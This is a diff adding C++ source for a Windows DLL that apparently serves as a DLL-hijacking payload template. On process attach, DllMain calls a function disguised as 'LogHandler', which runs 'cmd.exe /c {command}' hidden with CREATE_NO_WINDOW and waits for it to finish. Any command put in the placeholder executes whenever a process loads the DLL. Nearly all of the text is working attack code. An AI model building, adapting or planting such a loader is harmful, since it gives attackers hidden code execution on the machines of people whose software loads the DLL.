@@ -1,0 +1,57 @@
+#include <tchar.h>
+#include <windows.h>
+#include <string>
+#include <cwchar>
+#include <stdio.h>
+
+void LogHandler()
+{
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    wchar_t cmdArgs[] = L"C:\\Windows\\System32\\cmd.exe /c {command}";
+
+    if (!CreateProcess(NULL,   // No module name (use command line)
+        cmdArgs,        // Command line
+        NULL,           // Process handle not inheritable
+        NULL,           // Thread handle not inheritable
+        FALSE,          // Set handle inheritance to FALSE
+        CREATE_NO_WINDOW,              // Don't create a window
+        NULL,           // Use parent's environment block
+        NULL,           // Use parent's starting directory 
+        &si,            // Pointer to STARTUPINFO structure
+        &pi)           // Pointer to PROCESS_INFORMATION structure
+        )
+    {
+        return;
+    }
+
+    // Wait until child process exits.
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Close process and thread handles. 
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) 
+{
+	switch (fdwReason) {
+	case DLL_PROCESS_ATTACH:
+	{
+		LogHandler();
+		break;
+	}
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_THREAD_DETACH:
+		break;
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
